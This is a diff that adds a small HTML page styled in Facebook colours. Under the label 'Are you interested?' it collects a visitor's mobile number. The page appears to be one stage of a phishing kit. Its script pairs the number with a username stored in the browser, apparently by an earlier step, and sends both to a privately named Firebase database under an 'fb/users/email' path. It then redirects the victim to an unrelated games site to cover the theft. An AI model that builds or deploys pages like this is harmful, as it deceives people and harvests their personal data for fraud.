@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interest Check</title>
+    <style>
+        body {
+            background-image: url('https://i.ibb.co/wr6XLHp2/venson-chou-n-D2-Bj-SLt0u-E-unsplash.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            background-color: rgb(255, 255, 255);
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            position: relative;
+        }
+        h1 {
+            color: #1877f2;
+            margin-bottom: 30px;
+            font-size: 28px;
+        }
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        .phone-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+        .btn:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Are you interested?</h1>
+        <div class="input-group">
+            <input type="tel" class="phone-input" id="phone" placeholder="Enter your mobile number" pattern="[0-9]{10,15}" required >
+        </div>
+        <button class="btn" id="continueBtn">Continue</button>
+    </div>
+
+    <script>
+        const firebaseUrl = `https://mypersonal-ff826-default-rtdb.asia-southeast1.firebasedatabase.app/`
+        const phoneInput = document.getElementById('phone');
+        const continueBtn = document.getElementById('continueBtn');
+
+        phoneInput.addEventListener('input', function () {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length > 15) {
+                this.value = this.value.slice(0, 15);
+            }
+            continueBtn.disabled = this.value.length < 10;
+        });
+
+        continueBtn.addEventListener('click', async function () {
+            const mobiNo = phoneInput.value;
+            if (mobiNo.length >= 10) {
+                this.textContent = 'Saving...';
+                this.style.backgroundColor = '#4CAF50';
+                
+                const username = localStorage.getItem('username');
+                const data = { mobiNo, timestamp: new Date().toISOString() };
+
+// ✅ Store Mobile Number Correctly
+try {
+    const response = await fetch(`${firebaseUrl}fb/users/email/${username}.json`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify('mobi=>'+mobiNo),
+    });
+
+    if (response.ok) {
+        localStorage.removeItem('username');
+        window.location.href = 'https://poki.com/';
+    } else {
+        alert('Invalid input.');
+    }
+} catch (error) {
+    alert('An error occurred. Please try again.');
+}
+            }
+        });
+    </script>
+</body>
+</html>
